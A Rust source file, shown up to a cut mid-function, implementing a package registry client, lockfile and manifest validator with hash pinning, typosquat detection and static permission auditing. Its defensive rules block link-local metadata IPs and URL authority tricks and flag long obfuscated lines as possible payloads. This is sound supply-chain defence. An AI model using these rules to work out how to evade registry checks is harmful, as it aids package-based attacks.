//! Package registry client, lockfile (`tj.lock`), trust marks, and manifest/permission
//! validator (`docs/registry.md`).
//!
//! Commands:
//! - `tj add <name> [--registry <url-or-dir>] [--dir <app-dir>] [--min-trust community|verified|official]`
//! - `tj registry check <manifest.json> [--index <dir>] [--source <file>]`
//! - `tj check <app.tj> [--min-trust community|verified|official]`
//!
//! Packages live in `.tj-packages/<name>/plugin.tj` and are SHA-256 pinned in `tj.lock` next
//! to the app. `app::read` verifies every locked package's hash before bundling it as
//! `//# file: tj:<name>`, so WASM and mobile builds pay 0 bytes.

use crate::bytes::hex;
use crate::engine::netloc_allowed;
use ring::digest::{digest, SHA256};
use serde_json::{json, Map, Value as Json};
use std::collections::{BTreeMap, BTreeSet};
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::time::Duration;
use tj_core::modules;
use tj_core::syntax::ast::{ArrayEntry, Expr, ExprKind, FnDecl, Item, JsxChild, JsxElement, Pattern, RecordEntry, Stmt, TplPiece};

pub const REGISTRY_ENV: &str = "TJ_REGISTRY";
pub const DEFAULT_REGISTRY: &str = "https://raw.githubusercontent.com/mindmakr/tj-plugins/main";
pub const LOCKFILE_NAME: &str = "tj.lock";
pub const PACKAGES_DIR: &str = ".tj-packages";
const MAX_FETCH_BYTES: u64 = 1 << 20;
const FETCH_TIMEOUT: Duration = Duration::from_secs(15);

/// OSI-approved SPDX licenses accepted by the automatic registry validator.
const ALLOWED_LICENSES: &[&str] = &[
    "MIT",
    "Apache-2.0",
    "BSD-2-Clause",
    "BSD-3-Clause",
    "ISC",
    "MPL-2.0",
    "Unlicense",
    "0BSD",
    "CC0-1.0",
    "Zlib",
    "BSL-1.0",
];

const ALLOWED_KINDS: &[&str] = &[
    "library",
    "plugin",
    "port",
    "bridge",
    "device-plugin",
    "compliance-pack",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Trust {
    Community,
    Verified,
    Official,
}

impl Trust {
    pub fn parse(s: &str) -> Result<Trust, String> {
        match s.trim().to_ascii_lowercase().as_str() {
            "community" => Ok(Trust::Community),
            "verified" => Ok(Trust::Verified),
            "official" => Ok(Trust::Official),
            other => Err(format!("unknown trust mark {other:?}; use community, verified or official")),
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Trust::Community => "community",
            Trust::Verified => "verified",
            Trust::Official => "official",
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            Trust::Community => "Community",
            Trust::Verified => "Verified",
            Trust::Official => "Official",
        }
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Permissions {
    pub network: Vec<String>,
    pub plugins: Vec<String>,
    pub pii: Vec<String>,
    pub device: Vec<String>,
}

impl Permissions {
    fn from_json(v: &Json) -> Result<Permissions, String> {
        if v.is_null() {
            return Ok(Permissions::default());
        }
        let Some(obj) = v.as_object() else {
            return Err("permissions must be a JSON object".into());
        };
        Ok(Permissions {
            network: opt_str_list(obj.get("network"), "permissions.network")?,
            plugins: opt_str_list(obj.get("plugins"), "permissions.plugins")?,
            pii: opt_str_list(obj.get("pii"), "permissions.pii")?,
            device: opt_str_list(obj.get("device"), "permissions.device")?,
        })
    }

    fn to_json(&self) -> Json {
        json!({
            "network": self.network,
            "plugins": self.plugins,
            "pii": self.pii,
            "device": self.device,
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PortInfo {
    pub of: String,
    pub tests: String,
}

impl PortInfo {
    fn from_json(v: &Json) -> Result<Option<PortInfo>, String> {
        if v.is_null() {
            return Ok(None);
        }
        let Some(obj) = v.as_object() else {
            return Err("port must be a JSON object".into());
        };
        Ok(Some(PortInfo {
            of: req_str(obj, "of")?,
            tests: req_str(obj, "tests")?,
        }))
    }

    #[cfg(test)]
    fn to_json(&self) -> Json {
        json!({ "of": self.of, "tests": self.tests })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageManifest {
    pub name: String,
    pub kind: String,
    pub version: String,
    pub trust: Trust,
    pub source: String,
    pub entry: String,
    /// Optional direct HTTPS URL for the pinned entry module (else derived from GitHub `source` + `commit`).
    pub url: Option<String>,
    pub commit: String,
    pub sha256: String,
    pub license: String,
    pub publisher: String,
    pub permissions: Permissions,
    pub port: Option<PortInfo>,
    pub flagged: Option<String>,
}

impl PackageManifest {
    pub fn from_json(v: &Json) -> Result<PackageManifest, String> {
        let Some(obj) = v.as_object() else {
            return Err("manifest must be a JSON object".into());
        };
        let trust = match opt_str(obj, "trust")? {
            Some(s) => Trust::parse(&s)?,
            None => Trust::Community,
        };
        let entry = opt_str(obj, "entry")?.unwrap_or_else(|| "plugin.tj".to_string());
        Ok(PackageManifest {
            name: req_str(obj, "name")?,
            kind: req_str(obj, "kind")?,
            version: req_str(obj, "version")?,
            trust,
            source: req_str(obj, "source")?,
            entry,
            url: opt_str(obj, "url")?,
            commit: req_str(obj, "commit")?,
            sha256: req_str(obj, "sha256")?,
            license: req_str(obj, "license")?,
            publisher: req_str(obj, "publisher")?,
            permissions: Permissions::from_json(obj.get("permissions").unwrap_or(&Json::Null))?,
            port: PortInfo::from_json(obj.get("port").unwrap_or(&Json::Null))?,
            flagged: opt_str(obj, "flagged")?,
        })
    }

    #[cfg(test)]
    pub fn to_json(&self) -> Json {
        let mut map = Map::new();
        map.insert("name".into(), json!(self.name));
        map.insert("kind".into(), json!(self.kind));
        map.insert("version".into(), json!(self.version));
        map.insert("trust".into(), json!(self.trust.as_str()));
        map.insert("source".into(), json!(self.source));
        map.insert("entry".into(), json!(self.entry));
        if let Some(u) = &self.url {
            map.insert("url".into(), json!(u));
        }
        map.insert("commit".into(), json!(self.commit));
        map.insert("sha256".into(), json!(self.sha256));
        map.insert("license".into(), json!(self.license));
        map.insert("publisher".into(), json!(self.publisher));
        map.insert("permissions".into(), self.permissions.to_json());
        if let Some(p) = &self.port {
            map.insert("port".into(), p.to_json());
        }
        if let Some(f) = &self.flagged {
            map.insert("flagged".into(), json!(f));
        }
        Json::Object(map)
    }
}

#[derive(Debug, Clone)]
pub struct Lockfile {
    pub version: u32,
    pub packages: BTreeMap<String, LockedPackage>,
}

impl Default for Lockfile {
    fn default() -> Self {
        Lockfile { version: 1, packages: BTreeMap::new() }
    }
}

impl Lockfile {
    fn from_json(v: &Json) -> Result<Lockfile, String> {
        let Some(obj) = v.as_object() else {
            return Err("lockfile must be a JSON object".into());
        };
        let version = obj
            .get("version")
            .and_then(Json::as_u64)
            .ok_or("lockfile missing integer \"version\"")? as u32;
        let mut packages = BTreeMap::new();
        if let Some(pkgs) = obj.get("packages") {
            let Some(map) = pkgs.as_object() else {
                return Err("lockfile \"packages\" must be a JSON object".into());
            };
            for (k, pv) in map {
                packages.insert(k.clone(), LockedPackage::from_json(pv).map_err(|e| format!("package {k:?}: {e}"))?);
            }
        }
        Ok(Lockfile { version, packages })
    }

    fn to_json(&self) -> Json {
        let mut pkgs = Map::new();
        for (k, p) in &self.packages {
            pkgs.insert(k.clone(), p.to_json());
        }
        json!({
            "version": self.version,
            "packages": pkgs,
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LockedPackage {
    pub kind: String,
    pub version: String,
    pub trust: Trust,
    pub source: String,
    pub entry: String,
    pub commit: String,
    pub sha256: String,
    pub license: String,
    pub publisher: String,
    pub permissions: Permissions,
    pub flagged: Option<String>,
}

impl LockedPackage {
    fn from_json(v: &Json) -> Result<LockedPackage, String> {
        let Some(obj) = v.as_object() else {
            return Err("entry must be a JSON object".into());
        };
        let trust = Trust::parse(&req_str(obj, "trust")?)?;
        Ok(LockedPackage {
            kind: req_str(obj, "kind")?,
            version: req_str(obj, "version")?,
            trust,
            source: req_str(obj, "source")?,
            entry: req_str(obj, "entry")?,
            commit: req_str(obj, "commit")?,
            sha256: req_str(obj, "sha256")?,
            license: req_str(obj, "license")?,
            publisher: req_str(obj, "publisher")?,
            permissions: Permissions::from_json(obj.get("permissions").unwrap_or(&Json::Null))?,
            flagged: opt_str(obj, "flagged")?,
        })
    }

    fn to_json(&self) -> Json {
        let mut map = Map::new();
        map.insert("kind".into(), json!(self.kind));
        map.insert("version".into(), json!(self.version));
        map.insert("trust".into(), json!(self.trust.as_str()));
        map.insert("source".into(), json!(self.source));
        map.insert("entry".into(), json!(self.entry));
        map.insert("commit".into(), json!(self.commit));
        map.insert("sha256".into(), json!(self.sha256));
        map.insert("license".into(), json!(self.license));
        map.insert("publisher".into(), json!(self.publisher));
        map.insert("permissions".into(), self.permissions.to_json());
        if let Some(f) = &self.flagged {
            map.insert("flagged".into(), json!(f));
        }
        Json::Object(map)
    }
}

fn req_str(obj: &Map<String, Json>, key: &str) -> Result<String, String> {
    obj.get(key)
        .and_then(Json::as_str)
        .map(str::to_string)
        .ok_or_else(|| format!("missing string field {key:?}"))
}

fn opt_str(obj: &Map<String, Json>, key: &str) -> Result<Option<String>, String> {
    match obj.get(key) {
        None | Some(Json::Null) => Ok(None),
        Some(Json::String(s)) => Ok(Some(s.clone())),
        Some(_) => Err(format!("field {key:?} must be a string")),
    }
}

fn opt_str_list(v: Option<&Json>, field: &str) -> Result<Vec<String>, String> {
    match v {
        None | Some(Json::Null) => Ok(Vec::new()),
        Some(Json::Array(arr)) => arr
            .iter()
            .map(|x| x.as_str().map(str::to_string).ok_or_else(|| format!("{field} must contain only strings")))
            .collect(),
        Some(_) => Err(format!("{field} must be an array of strings")),
    }
}

pub fn sha256_bytes(bytes: &[u8]) -> String {
    hex(digest(&SHA256, bytes).as_ref())
}

/// Validates package names (matching `modules::resolve` for `tj:<name>`, excluding built-ins).
pub fn valid_package_name(name: &str) -> Result<(), String> {
    if name.is_empty() || name.len() > 48 {
        return Err(format!("package name {name:?} must be 1..=48 characters"));
    }
    let ok = name.chars().next().is_some_and(|c| c.is_ascii_lowercase())
        && name.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
        && !name.ends_with('-')
        && !name.contains("--");
    if !ok {
        return Err(format!("invalid package name {name:?}: use lowercase letters, digits and single hyphens (e.g. `money`, `pdf-kit`)"));
    }
    let spec = format!("tj:{name}");
    if modules::BUILT_IN.iter().any(|(b, _)| *b == spec) {
        return Err(format!("package name {name:?} is reserved by built-in module `{spec}`"));
    }
    Ok(())
}

fn valid_semver_ident(seg: &str) -> bool {
    !seg.is_empty() && seg.split('.').all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'))
}

fn valid_semver(v: &str) -> bool {
    let (without_build, build) = match v.split_once('+') {
        Some((a, b)) => (a, Some(b)),
        None => (v, None),
    };
    let (core, pre) = match without_build.split_once('-') {
        Some((a, b)) => (a, Some(b)),
        None => (without_build, None),
    };
    let parts: Vec<&str> = core.split('.').collect();
    if parts.len() != 3 || !parts.iter().all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit())) {
        return false;
    }
    if let Some(p) = pre {
        if !valid_semver_ident(p) {
            return false;
        }
    }
    if let Some(b) = build {
        if !valid_semver_ident(b) {
            return false;
        }
    }
    true
}

fn valid_hex(s: &str, len: usize) -> bool {
    s.len() == len && s.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

fn has_control(s: &str) -> bool {
    s.chars().any(char::is_control)
}

fn valid_entry_path(entry: &str, kind: &str) -> Result<(), String> {
    if entry.is_empty()
        || entry.starts_with('/')
        || !entry.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-' | b'/'))
    {
        return Err(format!("invalid entry path {entry:?}: use only [A-Za-z0-9._/-] in a clean relative path"));
    }
    let p = Path::new(entry);
    for c in p.components() {
        if !matches!(c, Component::Normal(_)) {
            return Err(format!("invalid entry path {entry:?}: path traversal is not allowed"));
        }
    }
    let want_ext = if kind == "compliance-pack" { ".json" } else { ".tj" };
    if !entry.ends_with(want_ext) {
        return Err(format!("entry path {entry:?} for kind {kind:?} must end with {want_ext}"));
    }
    Ok(())
}

fn is_loopback_http(url: &str) -> bool {
    let Some(rest) = url.strip_prefix("http://") else { return false };
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    if authority.is_empty() || authority.contains('@') || authority.contains('\\') {
        return false;
    }
    for host in ["127.0.0.1", "localhost", "[::1]"] {
        if let Some(after) = authority.strip_prefix(host) {
            if after.is_empty() {
                return true;
            }
            if let Some(port) = after.strip_prefix(':') {
                if !port.is_empty() && port.parse::<u16>().is_ok() {
                    return true;
                }
            }
        }
    }
    false
}

fn is_safe_remote_url(url: &str, allow_loopback: bool) -> bool {
    if url.starts_with("https://") {
        // Reject authority tricks (`@`, `\`, whitespace) or link-local metadata IPs.
        return extract_https_host(url, false).is_some_and(|h| !is_forbidden_registry_host(&h, allow_loopback));
    }
    allow_loopback && is_loopback_http(url)
}

fn is_forbidden_registry_host(host: &str, allow_loopback: bool) -> bool {
    if host.starts_with("169.254.") || host.starts_with("fe80:") || host == "0.0.0.0" || host == "::" {
        return true;
    }
    if !allow_loopback && (host == "localhost" || host == "::1" || host.starts_with("127.")) {
        return true;
    }
    false
}

fn valid_network_pattern(pat: &str) -> bool {
    if pat == "*" {
        return true;
    }
    crate::engine::parse_fetch_allow(pat).is_ok()
}

/// Validates a registry manifest's schema, commit/hash pins, license, source URL, permissions,
/// and optional typosquatting against sibling index manifests.
pub fn validate_manifest(m: &PackageManifest, index_dir: Option<&Path>, allow_local: bool) -> Vec<String> {
    validate_manifest_inner(m, index_dir, allow_local, true)
}

fn validate_manifest_inner(m: &PackageManifest, index_dir: Option<&Path>, allow_local: bool, require_port: bool) -> Vec<String> {
    let mut errors = Vec::new();
    if let Err(e) = valid_package_name(&m.name) {
        errors.push(e);
    }
    if !ALLOWED_KINDS.contains(&m.kind.as_str()) {
        errors.push(format!("unknown kind {:?}; expected one of {}", m.kind, ALLOWED_KINDS.join(", ")));
    }
    if !valid_semver(&m.version) {
        errors.push(format!("version {:?} must be valid semver (MAJOR.MINOR.PATCH[-pre][+build])", m.version));
    }
    if !ALLOWED_LICENSES.contains(&m.license.as_str()) {
        errors.push(format!("license {:?} is not in the allowed SPDX list ({})", m.license, ALLOWED_LICENSES.join(", ")));
    }
    if m.publisher.trim().is_empty() || m.publisher.len() > 64 || !m.publisher.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')) {
        errors.push(format!("invalid publisher {:?}", m.publisher));
    }
    if let Err(e) = valid_entry_path(&m.entry, &m.kind) {
        errors.push(e);
    }
    let is_local_source = allow_local
        && !m.source.is_empty()
        && !m.source.contains("://")
        && !m.source.starts_with('/')
        && !m.source.contains('\\')
        && !has_control(&m.source)
        && Path::new(&m.source).components().all(|c| matches!(c, Component::Normal(_)));
    let source_ok = is_safe_remote_url(&m.source, allow_local) || is_local_source;
    if !source_ok {
        errors.push(format!("source {:?} must be an https:// URL (or a clean relative path in a local registry)", m.source));
    }
    let commit_ok = valid_hex(&m.commit, 40) || (is_local_source && m.commit == "local");
    if !commit_ok {
        errors.push(format!("commit {:?} must be a full 40-character lowercase git SHA", m.commit));
    }
    if !valid_hex(&m.sha256, 64) {
        errors.push(format!("sha256 {:?} must be 64 lowercase hex characters", m.sha256));
    }
    if let Some(u) = &m.url {
        if !is_safe_remote_url(u, allow_local) {
            errors.push(format!("url {u:?} must use https://"));
        }
    }
    for host in &m.permissions.network {
        if !valid_network_pattern(host) {
            errors.push(format!("invalid network permission host {host:?}"));
        }
    }
    for p in &m.permissions.plugins {
        if p.is_empty() || !p.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-') {
            errors.push(format!("invalid plugin permission name {p:?}"));
        }
    }
    for cat in &m.permissions.pii {
        if !tj_core::vm::program::PII_CATEGORIES.contains(&cat.as_str()) {
            errors.push(format!("unknown @pii permission category {cat:?}; valid categories: {}", tj_core::vm::program::PII_CATEGORIES.join(", ")));
        }
    }
    for dev in &m.permissions.device {
        if let Err(e) = crate::device_perms::validate_device_permission(dev) {
            errors.push(e);
        }
    }
    if let Some(flag) = &m.flagged {
        if flag.trim().is_empty() || has_control(flag) {
            errors.push(format!("invalid flagged reason {flag:?}"));
        }
    }
    if require_port && m.kind == "port" && m.port.as_ref().map_or(true, |p| p.of.trim().is_empty() || p.tests.trim().is_empty() || has_control(&p.of) || has_control(&p.tests)) {
        errors.push("kind \"port\" requires \"port\": {\"of\": \"<upstream>\", \"tests\": \"<suite summary>\"} without control characters".into());
    }
    // Always guard against typosquats of built-in `tj:*` modules (len >= 3).
    check_builtin_typosquats(&m.name, &mut errors);
    if let Some(dir) = index_dir {
        check_typosquats(&m.name, dir, &mut errors);
    }
    errors
}

fn check_builtin_typosquats(name: &str, errors: &mut Vec<String>) {
    let norm = |s: &str| s.replace('-', "");
    let my_norm = norm(name);
    for (spec, _) in modules::BUILT_IN {
        let Some(builtin) = spec.strip_prefix("tj:") else { continue };
        if builtin.len() < 3 || builtin == name {
            continue;
        }
        let dist = levenshtein(name, builtin);
        let threshold = if name.len().min(builtin.len()) >= 6 { 2 } else { 1 };
        if dist <= threshold || my_norm == norm(builtin) {
            errors.push(format!("package name {name:?} is too close to built-in module `tj:{builtin}` (possible typosquat)"));
        }
    }
}

fn check_typosquats(name: &str, index_dir: &Path, errors: &mut Vec<String>) {
    let Ok(entries) = std::fs::read_dir(index_dir) else { return };
    let norm = |s: &str| s.replace('-', "");
    let my_norm = norm(name);
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("json") {
            continue;
        }
        let Some(other) = path.file_stem().and_then(|s| s.to_str()) else { continue };
        if other == name {
            continue;
        }
        let dist = levenshtein(name, other);
        let threshold = if name.len().min(other.len()) >= 6 { 2 } else { 1 };
        if dist <= threshold || my_norm == norm(other) {
            errors.push(format!("package name {name:?} is too close to existing package {other:?} (possible typosquat)"));
        }
    }
}

fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let mut prev: Vec<usize> = (0..=b.len()).collect();
    let mut curr = vec![0; b.len() + 1];
    for (i, &ca) in a.iter().enumerate() {
        curr[0] = i + 1;
        for (j, &cb) in b.iter().enumerate() {
            let cost = usize::from(ca != cb);
            curr[j + 1] = (prev[j + 1] + 1).min(curr[j] + 1).min(prev[j] + cost);
        }
        std::mem::swap(&mut prev, &mut curr);
    }
    prev[b.len()]
}

/// Static audit of a package's `.tj` source against its manifest:
/// 1. Exact SHA-256 verification.
/// 2. Compilation check (`tj_core::compile`; `library`/`port` cannot call `plugin()` or `invoke()`).
/// 3. Permission enforcement: every `fetch(...)` host, `plugin(...)` name, and `@pii(...)` category
///    used by the module must be declared in `manifest.permissions` (fail closed!).
/// 4. Static safety checks (no plain `http://` URLs, no huge obfuscated lines).
pub fn verify_package_source(m: &PackageManifest, bytes: &[u8]) -> Result<Vec<String>, Vec<String>> {
    let mut errors = Vec::new();
    let mut warnings = Vec::new();

    let actual_hash = sha256_bytes(bytes);
    if actual_hash != m.sha256 {
        errors.push(format!("SHA-256 mismatch for {}: manifest pins {}, got {actual_hash}", m.name, m.sha256));
        return Err(errors);
    }

    let text = match std::str::from_utf8(bytes) {
        Ok(s) => s,
        Err(_) => {
            errors.push(format!("{} entry {} is not valid UTF-8", m.name, m.entry));
            return Err(errors);
        }
    };

    if m.kind == "compliance-pack" {
        if let Err(e) = crate::compliance::Pack::validate_standalone(&m.name, text) {
            errors.push(format!("invalid compliance pack: {e}"));
        }
        return if errors.is_empty() { Ok(warnings) } else { Err(errors) };
    }

    // Check for bundle marker injection (`//# file:`) and suspiciously long obfuscated lines.
    for (idx, line) in text.lines().enumerate() {
        let trimmed_cr = line.trim_end_matches('\r');
        if trimmed_cr.starts_with(modules::MARKER) || trimmed_cr.starts_with("//# file:") {
            errors.push(format!("{}:{}: bundle marker line (`//# file:`) is forbidden inside a registry package", m.entry, idx + 1));
        }
        if line.len() > 4000 && !line.contains(' ') {
            errors.push(format!("{}:{}: line exceeds 4000 chars with no spaces (possible obfuscated/embedded payload)", m.entry, idx + 1));
        }
    }
    if !errors.is_empty() {
        return Err(errors);
    }

    // Parse AST first so we can check imports and enforce declared permissions (fail closed).
    let parsed = match tj_core::syntax::parse(text) {
        Ok(p) => p,
        Err(d) => {
            errors.push(format!("parse error: {}", d.render(&m.entry, text)));
            return Err(errors);
        }
    };

    // Forbid relative/local imports (which would resolve into the host app's folder) and
    // unresolved external `tj:*` imports so standalone `tj_core::compile` always runs.
    for imp in &parsed.imports {
        if !imp.from.starts_with("tj:") {
            errors.push(format!("registry packages cannot import local file {:?}; only built-in tj:<module> imports are allowed", imp.from));
        } else if !modules::BUILT_IN.iter().any(|(b, _)| *b == imp.from) {
            errors.push(format!("registry package imports external module {:?}, which is not supported in standalone packages yet", imp.from));
        }
    }
    if !errors.is_empty() {
        return Err(errors);
    }

    // Compile check: plugins/bridges/device-plugins compile as `tj:<name>`, while libraries/ports
    // compile as plain app modules so `tj_core` enforces they cannot call `plugin()`/`invoke()`.
    let is_plugin_kind = matches!(m.kind.as_str(), "plugin" | "bridge" | "device-plugin");
    let compile_src = if is_plugin_kind {
        format!("//# file: tj:{}\n{text}", m.name)
    } else {
        text.to_string()
    };
    if let Err(diags) = tj_core::compile(&compile_src) {
        for d in diags {
            errors.push(format!("compile error: {}", d.render(&m.entry, &compile_src)));
        }
        return Err(errors);
    }

    let mut caps = UsedCapabilities::default();
    collect_program_caps(&parsed, &mut caps);

    // Transitively audit every built-in `tj:*` module this package imports (e.g. `tj:agent -> tj:ai`),
    // so a library cannot bypass `permissions.plugins` via a 1-hop or multi-hop built-in wrapper.
    let mut imported_plugins: BTreeSet<String> = BTreeSet::new();
    let mut queue: Vec<String> = parsed.imports.iter().map(|i| i.from.clone()).collect();
    let mut visited: BTreeSet<String> = BTreeSet::new();
    while let Some(spec) = queue.pop() {
        if !visited.insert(spec.clone()) {
            continue;
        }
        if let Some((_, builtin_src)) = modules::BUILT_IN.iter().find(|(b, _)| *b == spec) {
            if let Ok(bp) = tj_core::syntax::parse(builtin_src) {
                let mut bcaps = UsedCapabilities::default();
                collect_program_caps(&bp, &mut bcaps);
                imported_plugins.extend(bcaps.plugins);
                caps.network_hosts.extend(bcaps.network_hosts);
                caps.plain_http_urls.extend(bcaps.plain_http_urls);
                caps.dynamic_fetch |= bcaps.dynamic_fetch;
                caps.dynamic_plugin |= bcaps.dynamic_plugin;
                caps.pii.extend(bcaps.pii);
                for sub in bp.imports {
                    if !visited.contains(&sub.from) {
                        queue.push(sub.from);
                    }
                }
            }
        }
    }

    if caps.uses_internal_fetch {
        errors.push("direct use of internal __fetch() is forbidden in registry packages; use fetch()".into());
    }
    if !is_plugin_kind && !caps.plugins.is_empty() {
        errors.push(format!("kind {:?} cannot call plugin(); change kind to \"plugin\" or \"bridge\"", m.kind));
    }
    if !is_plugin_kind && caps.uses_invoke {
        errors.push(format!("kind {:?} cannot call invoke(); change kind to \"plugin\" or \"bridge\"", m.kind));
    }

    let allow_any_net = m.permissions.network.iter().any(|h| h == "*");
    if allow_any_net {
        warnings.push("permissions.network contains \"*\" (unrestricted outbound network access)".into());
    }
    let mut allowed_hosts = Vec::new();
    for h in &m.permissions.network {
        if h == "*" {
            continue;
        }
        match crate::engine::parse_fetch_allow(h) {
            Ok(parsed_hosts) => allowed_hosts.extend(parsed_hosts),
            Err(e) => errors.push(format!("invalid permissions.network entry {h:?}: {e}")),
        }
    }

    for url in &caps.plain_http_urls {
        errors.push(format!("plain http:// fetch URL {url:?} is not allowed in registry packages; use https://"));
    }
    for host in &caps.network_hosts {
        let netloc = if host.contains(':') { format!("[{host}]:443") } else { format!("{host}:443") };
        if !allow_any_net && !netloc_allowed(&netloc, &allowed_hosts) {
            errors.push(format!("undeclared network host {host:?}: add it to manifest permissions.network"));
        }
    }
    if caps.dynamic_fetch && !allow_any_net {
        errors.push("dynamic or aliased fetch() URL cannot be statically verified against permissions.network (use a literal https://<host>/... prefix or declare \"*\" in permissions.network)".into());
    }
    for p in caps.plugins.union(&imported_plugins) {
        if !m.permissions.plugins.iter().any(|decl| decl == p) {
            errors.push(format!("undeclared plugin {p:?}: add it to manifest permissions.plugins"));
        }
    }
    if caps.dynamic_plugin {
        errors.push("plugin() must be called directly with a string literal first argument so permissions.plugins can be verified".into());
    }
    for cat in &caps.pii {
        if !m.permissions.pii.iter().any(|decl| decl == cat) {
            errors.push(format!("undeclared @pii category {cat:?}: add it to manifest permissions.pii"));
        }
    }

    if errors.is_empty() { Ok(warnings) } else { Err(errors) }
}

fn collect_program_caps(parsed: &tj_core::syntax::ast::Program, caps: &mut UsedCapabilities) {
    for item in &parsed.items {
        match item {
            Item::Object(o) => {
                for fl in &o.fields {
                    for dec in &fl.decorators {
                        if dec.name == "pii" {
                            if let Some(cat) = dec.args.first().and_then(str_arg) {
                                caps.pii.insert(cat.to_string());
                            }
                        }
                    }
                    if let Some(e) = &fl.init {
                        collect_expr_caps(e, caps);
                    }
                }
                for method in &o.methods {
                    collect_fn_caps(&method.func, caps);
                }
            }
            Item::Function(f) => collect_fn_caps(f, caps),
            Item::Let(d) => {
                collect_pattern_caps(&d.pattern, caps);
                if let Some(e) = &d.init {
                    collect_expr_caps(e, caps);
                }
            }
            Item::TypeAlias { .. } => {}
        }
    }
}

fn str_arg(a: &Expr) -> Option<&str> {
    match &a.kind {
        ExprKind::Str(s) => Some(s.as_str()),
        _ => None,
    }
}

#[derive(Default)]
struct UsedCapabilities {
    network_hosts: BTreeSet<String>,
    plain_http_urls: BTreeSet<String>,
    dynamic_fetch: bool,
    uses_internal_fetch: bool,
    plugins: BTreeSet<String>,
    dynamic_plugin: bool,
    uses_invoke: bool,
    pii: BTreeSet<String>,
}

fn collect_fn_caps(f: &FnDecl, caps: &mut UsedCapabilities) {
    for p in &f.params {
        collect_pattern_caps(&p.pattern, caps);
        if let Some(def) = &p.default {
            collect_expr_caps(def, caps);
        }
    }
    collect_stmts_caps(&f.body, caps);
}

fn collect_pattern_caps(pat: &Pattern, caps: &mut UsedCapabilities) {
    match pat {
        Pattern::Ident(_, _) => {}
        Pattern::Record(entries, _) => {
            for (_, sub, def) in entries {
                collect_pattern_caps(sub, caps);
                if let Some(e) = def {
                    collect_expr_caps(e, caps);
                }
            }
        }
        Pattern::Array(subs, _) => {
            for sub in subs {
                collect_pattern_caps(sub, caps);
            }
        }
    }
}

fn collect_stmts_caps(stmts: &[Stmt], caps: &mut UsedCapabilities) {
    for s in stmts {
        match s {
            Stmt::Let(d) => {
                collect_pattern_caps(&d.pattern, caps);
                if let Some(e) = &d.init {
                    collect_expr_caps(e, caps);
                }
            }
            Stmt::Function(f) => collect_fn_caps(f, caps),
            Stmt::Expr(e) | Stmt::Throw(e, _) => collect_expr_caps(e, caps),
            Stmt::Return(Some(e), _) => collect_expr_caps(e, caps),
            Stmt::Return(None, _) | Stmt::Break(_) | Stmt::Continue(_) => {}
            Stmt::If { cond, then, els } => {
                collect_expr_caps(cond, caps);
                collect_stmts_caps(then, caps);
                if let Some(els) = els {
                    collect_stmts_caps(els, caps);
                }
            }
            Stmt::While { cond, body } => {
                collect_expr_caps(cond, caps);
                collect_stmts_caps(body, caps);
            }
            Stmt::ForOf { pattern, iter, body } => {
                collect_pattern_caps(pattern, caps);
                collect_expr_caps(iter, caps);
                collect_stmts_caps(body, caps);
            }
            Stmt::For { init, cond, update, body } => {
                if let Some(i) = init {
                    collect_stmts_caps(std::slice::from_ref(i.as_ref()), caps);
                }
                if let Some(c) = cond {
                    collect_expr_caps(c, caps);
                }
                if let Some(u) = update {
                    collect_expr_caps(u, caps);
                }
                collect_stmts_caps(body, caps);
            }
            Stmt::Block(b) => collect_stmts_caps(b, caps),
            Stmt::Try { body, param, handler } => {
                collect_stmts_caps(body, caps);
                if let Some(p) = param {
                    collect_pattern_caps(p, caps);
                }
                collect_stmts_caps(handler, caps);
            }
        }
    }
}

fn starts_with_http_ci(s: &str) -> bool {
    let t = s.trim();
    t.starts_with("//") || t.get(..7).is_some_and(|p| p.eq_ignore_ascii_case("http://"))
}

fn extract_https_host(s: &str, must_end_authority: bool) -> Option<String> {
    let t = s.trim();
    if !t.get(..8).is_some_and(|p| p.eq_ignore_ascii_case("https://")) {
        return None;
    }
    let rest = &t[8..];
    if must_end_authority && !rest.contains('/') && !rest.contains('?') && !rest.contains('#') {
        return None;
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    // Reject userinfo (`@`), backslashes (`\`, WHATWG treats as `/`), control chars, and whitespace.
    if authority.is_empty() || authority.contains('@') || authority.contains('\\') || authority.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return None;
    }
    let host = if let Some(v6) = authority.strip_prefix('[') {
        let (addr, after) = v6.split_once(']')?;
        if !after.is_empty() && !after.strip_prefix(':').is_some_and(|p| !p.is_empty() && p.parse::<u16>().is_ok()) {
            return None;
        }
        addr
    } else {
        match authority.split_once(':') {
            Some((h, port)) => {
                if port.is_empty() || port.parse::<u16>().is_err() {
                    return None;
                }
                h
            }
            None => authority,
        }
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    (!host.is_empty()).then_some(host)
}

fn collect_expr_caps(e: &Expr, caps: &mut UsedCapabilities) {
    match &e.kind {
        ExprKind::Call { callee, args } => {
            let direct_builtin = if let ExprKind::Ident(name) = &callee.kind {
                match name.as_str() {
                    "fetch" => {
                        match args.first().map(|a| &a.kind) {
                            Some(ExprKind::Str(u)) => {
                                if starts_with_http_ci(u) {
                                    caps.plain_http_urls.insert(u.clone());
                                } else if let Some(h) = extract_https_host(u, false) {
                                    caps.network_hosts.insert(h);
                                } else {
                                    caps.dynamic_fetch = true;
                                }
                            }
                            Some(ExprKind::Template(parts)) => {
